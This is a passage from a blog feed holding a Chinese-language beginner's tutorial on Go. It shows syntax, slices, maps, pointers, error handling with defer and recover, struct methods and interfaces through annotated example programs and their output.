err</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>技术</category>
      
    </categories>
    
    
    <tags>
      
      <tag>go</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Go快速上手—基本语言特性篇</title>
    <link href="/2021/05/04/Go%E5%BF%AB%E9%80%9F%E4%B8%8A%E6%89%8B%E2%80%94%E5%9F%BA%E6%9C%AC%E8%AF%AD%E8%A8%80%E7%89%B9%E6%80%A7%E7%AF%87/"/>
    <url>/2021/05/04/Go%E5%BF%AB%E9%80%9F%E4%B8%8A%E6%89%8B%E2%80%94%E5%9F%BA%E6%9C%AC%E8%AF%AD%E8%A8%80%E7%89%B9%E6%80%A7%E7%AF%87/</url>
    
    <content type="html"><![CDATA[<h2 id="编译和运行"><a href="#编译和运行" class="headerlink" title="编译和运行"></a>编译和运行</h2><ul><li>go run main.go  直接运行</li><li>go build -o test main.go  指定文件名输出二进制文件</li></ul><h2 id="基础语法"><a href="#基础语法" class="headerlink" title="基础语法"></a>基础语法</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="string">&quot;reflect&quot;</span></span><br><span class="line"><span class="string">&quot;os&quot;</span></span><br><span class="line"><span class="string">&quot;errors&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">add</span><span class="params">(num <span class="keyword">int</span>)</span></span>&#123;</span><br><span class="line">num += <span class="number">1</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">realAdd</span><span class="params">(num *<span class="keyword">int</span>)</span></span>&#123;</span><br><span class="line">*num += <span class="number">1</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">add2</span> <span class="params">(n1 <span class="keyword">int</span>, n2 <span class="keyword">int</span>)</span> <span class="params">(<span class="keyword">int</span>, <span class="keyword">int</span>)</span></span> &#123;</span><br><span class="line"><span class="keyword">return</span> n1+n2, n1-n2</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">say</span><span class="params">(name <span class="keyword">string</span>)</span> <span class="title">error</span></span> &#123;</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(name) == <span class="number">0</span> &#123;</span><br><span class="line"><span class="keyword">return</span> errors.New(<span class="string">&quot;error:name is null&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line">fmt.Println(<span class="string">&quot;hello &quot;</span>, name)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Student <span class="keyword">struct</span> &#123;</span><br><span class="line">name <span class="keyword">string</span></span><br><span class="line">age <span class="keyword">int</span></span><br><span class="line">info <span class="keyword">map</span>[<span class="keyword">string</span>]<span class="keyword">string</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(stu *Student)</span> <span class="title">hello</span><span class="params">(person <span class="keyword">string</span>)</span> <span class="title">string</span></span> &#123;</span><br><span class="line"><span class="keyword">return</span> fmt.Sprintf(<span class="string">&quot;hello %s, i am %s&quot;</span>, person, stu.name)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">get</span><span class="params">(index <span class="keyword">int</span>)</span> <span class="params">(ret <span class="keyword">int</span>)</span></span> &#123;</span><br><span class="line"><span class="keyword">defer</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">if</span> r := <span class="built_in">recover</span>(); r != <span class="literal">nil</span> &#123;</span><br><span class="line">fmt.Println(<span class="string">&quot;some err happens!&quot;</span>, r)</span><br><span class="line">&#125;</span><br><span class="line">ret = <span class="number">-1</span></span><br><span class="line">&#125;()</span><br><span class="line">arr := [<span class="number">3</span>]<span class="keyword">int</span>&#123;<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>&#125;</span><br><span class="line"><span class="keyword">return</span> arr[index]</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span>  &#123;</span><br><span class="line"><span class="keyword">var</span> name <span class="keyword">string</span> = <span class="string">&quot;Hello world!&quot;</span></span><br><span class="line"><span class="keyword">var</span> a = <span class="number">1</span> <span class="comment">//默认是整型</span></span><br><span class="line">b := <span class="number">2</span></span><br><span class="line">c := <span class="string">&quot;my name&quot;</span></span><br><span class="line"><span class="keyword">var</span> d <span class="keyword">int</span> <span class="comment">// 默认为0</span></span><br><span class="line"><span class="keyword">var</span> e <span class="keyword">byte</span> = <span class="string">&#x27;a&#x27;</span></span><br><span class="line"><span class="keyword">var</span> f <span class="keyword">int8</span> = <span class="number">1</span></span><br><span class="line"><span class="keyword">var</span> g <span class="keyword">float32</span> = <span class="number">1.0</span></span><br><span class="line">ok := <span class="literal">false</span></span><br><span class="line"></span><br><span class="line">str1 := <span class="string">&quot;Go学习&quot;</span>  <span class="comment">// 中文一个字一般占3个字节</span></span><br><span class="line">fmt.Println(name)</span><br><span class="line">fmt.Println(a,b,c,d,e,f,g,ok) <span class="comment">// 1 2 my name 0 97 1 1 false</span></span><br><span class="line">fmt.Println(reflect.TypeOf(str1[<span class="number">2</span>]).Kind()) <span class="comment">// 打印类型,uint8</span></span><br><span class="line">fmt.Printf(<span class="string">&quot;%d %c\n&quot;</span>, str1[<span class="number">1</span>], str1[<span class="number">1</span>])</span><br><span class="line">fmt.Println(<span class="string">&quot;len(str1)=&quot;</span>, <span class="built_in">len</span>(str1)) <span class="comment">// 8字节</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//将str1切割成rune数组，一个元素是一个汉字或字母</span></span><br><span class="line"><span class="comment">//转换成 []rune 类型后，字符串中的每个字符，无论占多少个字节都用 int32 来表示，因而可以正确处理中文。</span></span><br><span class="line"><span class="comment">//rune 类型，代表一个 UTF-8 字符，当需要处理中文、日文或者其他复合字符时，则需要用到 rune 类型。rune 类型等价于 int32 类型。</span></span><br><span class="line">runeArr := []<span class="keyword">rune</span>(str1)  <span class="comment">// 等价于 runeArr := []int32(str1)</span></span><br><span class="line">fmt.Println(reflect.TypeOf(runeArr[<span class="number">2</span>]).Kind()) <span class="comment">// int32</span></span><br><span class="line">fmt.Printf(<span class="string">&quot;%d %c\n&quot;</span>, runeArr[<span class="number">2</span>], runeArr[<span class="number">2</span>])  <span class="comment">// 23398 学</span></span><br><span class="line">fmt.Println(<span class="string">&quot;len(runeArr)=&quot;</span>, <span class="built_in">len</span>(runeArr)) <span class="comment">// 4，元素个数</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 声明数组</span></span><br><span class="line"><span class="keyword">var</span> arr [<span class="number">5</span>]<span class="keyword">int</span> </span><br><span class="line"><span class="keyword">var</span> arr2 [<span class="number">5</span>][<span class="number">5</span>]<span class="keyword">int</span> <span class="comment">// 二维</span></span><br><span class="line"><span class="comment">// 声明+初始化</span></span><br><span class="line"><span class="keyword">var</span> arr3 = [<span class="number">5</span>]<span class="keyword">int</span>&#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>&#125;</span><br><span class="line">arr4 := [<span class="number">5</span>]<span class="keyword">int</span>&#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>&#125;</span><br><span class="line"><span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="built_in">len</span>(arr3); i++ &#123;</span><br><span class="line">arr3[i] += <span class="number">100</span></span><br><span class="line">&#125;</span><br><span class="line">fmt.Println(arr)</span><br><span class="line">fmt.Println(arr2)</span><br><span class="line">fmt.Println(arr3)</span><br><span class="line">fmt.Println(arr4)</span><br><span class="line"></span><br><span class="line"><span class="comment">//数组的长度不能改变，如果想拼接2个数组，或是获取子数组，需要使用切片。</span></span><br><span class="line"><span class="comment">// 切片是数组的抽象。 切片使用数组作为底层结构。</span></span><br><span class="line">slice1 := <span class="built_in">make</span>([]<span class="keyword">float32</span>, <span class="number">0</span>)  <span class="comment">// 长度为0的切片</span></span><br><span class="line">slice2 := <span class="built_in">make</span>([]<span class="keyword">float32</span>, <span class="number">3</span>, <span class="number">5</span>) <span class="comment">// 长度为3容量为5的切片</span></span><br><span class="line">fmt.Println(<span class="built_in">len</span>(slice1), <span class="built_in">cap</span>(slice2))  <span class="comment">// 0 5</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">slice2 = <span class="built_in">append</span>(slice2, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>) </span><br><span class="line">fmt.Println(<span class="built_in">len</span>(slice2), <span class="built_in">cap</span>(slice2)) <span class="comment">// 7 12</span></span><br><span class="line">fmt.Println(slice2)</span><br><span class="line">sub1 := slice2[<span class="number">3</span>:]  <span class="comment">//[1 2 3 4]</span></span><br><span class="line">sub2 := slice2[:<span class="number">4</span>] <span class="comment">// [0 0 0 1]</span></span><br><span class="line">sub3 := slice2[<span class="number">1</span>:<span class="number">5</span>] <span class="comment">// [0 0 1 2]</span></span><br><span class="line">combine := <span class="built_in">append</span>(sub1, sub2...) <span class="comment">///sub2... 是切片解构的写法，将切片解构为 N 个独立的元素。[1 2 3 4 0 0 0 1]</span></span><br><span class="line"></span><br><span class="line">fmt.Println(sub1)</span><br><span class="line">fmt.Println(sub2)</span><br><span class="line">fmt.Println(sub3)</span><br><span class="line">fmt.Println(combine)</span><br><span class="line"></span><br><span class="line">m1 := <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="keyword">string</span>]<span class="keyword">int</span>)</span><br><span class="line"><span class="comment">// 声明加初始化</span></span><br><span class="line">m2 := <span class="keyword">map</span>[<span class="keyword">string</span>]<span class="keyword">int</span> &#123;</span><br><span class="line"><span class="string">&quot;grade&quot;</span> : <span class="number">100</span>,</span><br><span class="line"><span class="string">&quot;level&quot;</span> : <span class="number">1</span>,</span><br><span class="line">&#125;</span><br><span class="line">m1[<span class="string">&quot;grade&quot;</span>] = <span class="number">101</span></span><br><span class="line">fmt.Println(m1)</span><br><span class="line">fmt.Println(m2)</span><br><span class="line"></span><br><span class="line">ss := <span class="string">&quot;golang&quot;</span></span><br><span class="line"><span class="keyword">var</span> p *<span class="keyword">string</span> = &amp;ss <span class="comment">// p 是指向ss的指针</span></span><br><span class="line">*p = <span class="string">&quot;golang-gogo&quot;</span></span><br><span class="line">fmt.Println(ss, *p)  <span class="comment">// golang-gogo golang-gogo</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//一般来说，指针通常在函数传递参数，或者给某个类型定义新的方法时使用。</span></span><br><span class="line"><span class="comment">//Go 语言中，参数是按值传递的，如果不使用指针，函数内部将会拷贝一份参数的副本，对参数的修改并不会影响到外部变量的值。</span></span><br><span class="line"><span class="comment">//如果参数使用指针，对参数的传递将会影响到外部变量。</span></span><br><span class="line">a1 := <span class="number">1</span></span><br><span class="line">add(a1)</span><br><span class="line">fmt.Println(a1) <span class="comment">// 1</span></span><br><span class="line">realAdd(&amp;a1)</span><br><span class="line">fmt.Println(a1)  <span class="comment">// 2</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Go 语言中没有枚举(enum)的概念，一般可以用常量的方式来模拟枚举。</span></span><br><span class="line"><span class="keyword">type</span> Gender <span class="keyword">int8</span>   <span class="comment">// 跟c的typedef一样的</span></span><br><span class="line"><span class="keyword">const</span> (</span><br><span class="line">MALE Gender = <span class="number">1</span></span><br><span class="line">FEMALE Gender = <span class="number">2</span></span><br><span class="line">)</span><br><span class="line"><span class="comment">//Go 语言的 switch 不需要 break，匹配到某个 case，执行完该 case 定义的行为后，默认不会继续往下执行。如果需要继续往下执行，需要使用 fallthrough</span></span><br><span class="line">gender := MALE</span><br><span class="line"><span class="keyword">switch</span> gender &#123;</span><br><span class="line"><span class="keyword">case</span> MALE:</span><br><span class="line">fmt.Println(<span class="string">&quot;i am male&quot;</span>)</span><br><span class="line"><span class="keyword">fallthrough</span></span><br><span class="line"><span class="keyword">case</span> FEMALE:</span><br><span class="line">fmt.Println(<span class="string">&quot;i am female&quot;</span>)</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">fmt.Println(<span class="string">&quot;unknown&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//output:</span></span><br><span class="line"><span class="comment">//i am male</span></span><br><span class="line"><span class="comment">//i am female</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 遍历</span></span><br><span class="line">nums := []<span class="keyword">int</span>&#123;<span class="number">10</span>, <span class="number">20</span>, <span class="number">30</span>&#125;</span><br><span class="line"><span class="keyword">for</span> i, num := <span class="keyword">range</span> nums &#123;</span><br><span class="line">fmt.Println(i, num)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">mm2 := <span class="keyword">map</span>[<span class="keyword">string</span>]<span class="keyword">string</span> &#123;</span><br><span class="line"><span class="string">&quot;key1&quot;</span>: <span class="string">&quot;val1&quot;</span>,</span><br><span class="line"><span class="string">&quot;key2&quot;</span>: <span class="string">&quot;val2&quot;</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> key,val := <span class="keyword">range</span> mm2 &#123;</span><br><span class="line">fmt.Println(key, val)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i, num := <span class="keyword">range</span> combine &#123;</span><br><span class="line">fmt.Println(i, num)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 如果调用成功，error 的值是 nil，</span></span><br><span class="line"><span class="comment">// 如果调用失败，例如文件不存在，我们可以通过 error 知道具体的错误信息。</span></span><br><span class="line">_, err := os.Open(<span class="string">&quot;a.txt&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span>&#123;</span><br><span class="line">fmt.Println(err)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">err = say(<span class="string">&quot;&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span>&#123;</span><br><span class="line">fmt.Println(err)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// error 往往是能预知的错误，但是也可能出现一些不可预知的错误，</span></span><br><span class="line"><span class="comment">// 例如数组越界，这种错误可能会导致程序非正常退出，在 Go 语言中称之为 panic。</span></span><br><span class="line">fmt.Println(get(<span class="number">5</span>))</span><br><span class="line">fmt.Println(<span class="string">&quot;finished&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 在 get 函数中，使用 defer 定义了异常处理的函数，在协程退出前，会执行完 defer 挂载的任务。因此如果触发了 panic，控制权就交给了 defer。</span></span><br><span class="line"><span class="comment">// 在 defer 的处理逻辑中，使用 recover，使程序恢复正常，并且将返回值设置为 -1，在这里也可以不处理返回值，如果不处理返回值，返回值将被置为默认值 0。</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//结构体和方法</span></span><br><span class="line">stu := &amp;Student &#123; </span><br><span class="line">name: <span class="string">&quot;Tom&quot;</span>,</span><br><span class="line">age: <span class="number">19</span>,</span><br><span class="line">&#125;</span><br><span class="line">msg := stu.hello(<span class="string">&quot;Ken&quot;</span>)</span><br><span class="line">fmt.Println(msg)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 可以new方法来new 实例</span></span><br><span class="line">stu2 := <span class="built_in">new</span>(Student)</span><br><span class="line">stu2.name = <span class="string">&quot;kk&quot;</span></span><br><span class="line">fmt.Println(stu2.hello(<span class="string">&quot;Alice&quot;</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">// 空接口,定义了一个没有任何方法的空接口，那么这个接口可以表示任意类型</span></span><br><span class="line">mmp := <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="keyword">string</span>]<span class="keyword">interface</span>&#123;&#125;)</span><br><span class="line">mmp[<span class="string">&quot;name&quot;</span>] = <span class="string">&quot;james&quot;</span></span><br><span class="line">mmp[<span class="string">&quot;age&quot;</span>] = <span class="number">20</span></span><br><span class="line">mmp[<span class="string">&quot;score&quot;</span>] = [<span class="number">3</span>]<span class="keyword">int</span>&#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>&#125;</span><br><span class="line">mmp[<span class="string">&quot;info&quot;</span>] = m2</span><br><span class="line">fmt.Println(mmp)  <span class="comment">// map[age:20 info:map[grade:100 level:1] name:james score:[1 2 3]]</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="方法和接口"><a href="#方法和接口" class="headerlink" title="方法和接口"></a>方法和接口</h2><p>在 Go 中，只需使用大写标识符，即可公开方法，使用非大写的标识符将方法设为私有方法。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="comment">// main.go</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> triangle <span class="keyword">struct</span> &#123;</span><br><span class="line">size <span class="keyword">int</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(t triangle)</span> <span class="title">perimeter</span><span class="params">()</span> <span class="title">int</span></span> &#123;</span><br><span class="line"><span class="keyword">return</span> t.size * <span class="number">3</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 指针可以直接修改变量值，而不发生复制</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(t *triangle)</span> <span class="title">doubleSize</span><span class="params">()</span></span> &#123;</span><br><span class="line">t.size *= <span class="number">2</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> colorTriangle <span class="keyword">struct</span> &#123;</span><br><span class="line">triangle</span><br><span class="line">color <span class="keyword">string</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 重载方法，没有重载该方法时，调用的是triangle的perimeter()</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(t colorTriangle)</span> <span class="title">perimeter</span><span class="params">()</span> <span class="title">int</span></span> &#123;</span><br><span class="line"><span class="keyword">return</span> t.size * <span class="number">2</span> * <span class="number">3</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">t := triangle&#123;<span class="number">3</span>&#125;</span><br><span class="line">fmt.Println(<span class="string">&quot;perimeter:&quot;</span>, t.perimeter())</span><br><span class="line">t.doubleSize()</span><br><span class="line">fmt.Println(<span class="string">&quot;doublesize:&quot;</span>, t.perimeter());</span><br><span class="line"></span><br><span class="line">s := colorTriangle&#123;triangle&#123;<span class="number">4</span>&#125;, <span class="string">&quot;blue&quot;</span>&#125;</span><br><span class="line">fmt.Println(<span class="string">&quot;perimeter color:&quot;</span>, s.perimeter())</span><br><span class="line">fmt.Println(<span class="string">&quot;perimeter normal:&quot;</span>, s.triangle.perimeter())</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>输出</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">perimeter: 9</span><br><span class="line">doublesize: 18</span><br><span class="line">perimeter color: 24</span><br><span class="line">perimeter normal: 12</span><br></pre></td></tr></table></figure><p>Go 中的接口是一种用于表示其他类型的行为的数据类型。 在你使用接口时，你的基本代码将变得更加灵活、适应性更强，因为你编写的代码未绑定到特定的实现。接口就是只声明了函数，但是函数尚未具体实现。</p><p>Go 中的接口是一种抽象类型，只包括具体类型必须拥有或实现的方法。 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">type Shape interface &#123;</span><br><span class="line">    Perimeter() float64</span><br><span class="line">    Area() float64</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="接口interface"><a href="#接口interface" class="headerlink" title="接口interface"></a>接口interface</h3><p>一般而言，接口定义了一组方法的集合，接口不能被实例化，一个类型可以实现多个接口。</p><p>这里的接口跟<code>C++</code>的多态性质比较像，一个interface可以指向任何实现了其定义的方法的struct，这就好比C++的基类指针指向子类对象，实现多态。</p><p>==对于任何数据类型，只要它的方法集合中完全包含了一个接口的全部特征（即全部的方法），那么它就一定是这个接口的实现类型。==</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;fmt&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Person <span class="keyword">interface</span> &#123;</span><br><span class="line">getName() <span class="keyword">string</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Student <span class="keyword">struct</span> &#123;</span><br><span class="line">name <span class="keyword">string</span> </span><br><span class="line">age <span class="keyword">int</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(stu *Student)</span> <span class="title">getName</span><span class="params">()</span> <span class="title">string</span></span> &#123;</span><br><span class="line"><span class="keyword">return</span> stu.name</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Worker <span class="keyword">struct</span> &#123;</span><br><span class="line">name <span class="keyword">string</span> </span><br><span class="line">gender <span class="keyword">string</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(wk * Worker)</span> <span class="title">getName</span><span class="params">()</span> <span class="title">string</span></span> &#123;</span><br><span class="line"><span class="keyword">return</span> wk.name</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">var</span> stu = Student&#123;</span><br><span class="line">name: <span class="string">&quot;Tom&quot;</span>,</span><br><span class="line">age: <span class="number">18</span>,</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> p Person = 